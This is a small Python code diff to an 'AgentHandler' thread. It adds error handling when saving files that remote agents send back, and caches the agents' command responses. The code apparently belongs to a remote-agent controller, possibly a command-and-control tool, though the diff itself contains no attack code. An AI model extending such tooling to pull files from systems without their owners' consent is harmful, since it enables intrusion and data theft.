@@ -148,9 +148,12 @@ class AgentHandler(threading.Thread):
 
                 if response.startswith("FILE:"):
                     file_data = response[len("FILE:"):]
-                    with open(file_name, "wb") as f:
-                        f.write(file_data.encode())
-                    response = "File downloaded successfully"
+                    try:
+                        with open(file_name, "wb") as f:
+                            f.write(file_data.encode())
+                        response = f"File '{file_name}' saved successfully"
+                    except Exception as e:
+                        response = f"Error saving file: {e}"
 
                 responses_dict[self.agent_id] = response
                 cache.set('command_responses', responses_dict)
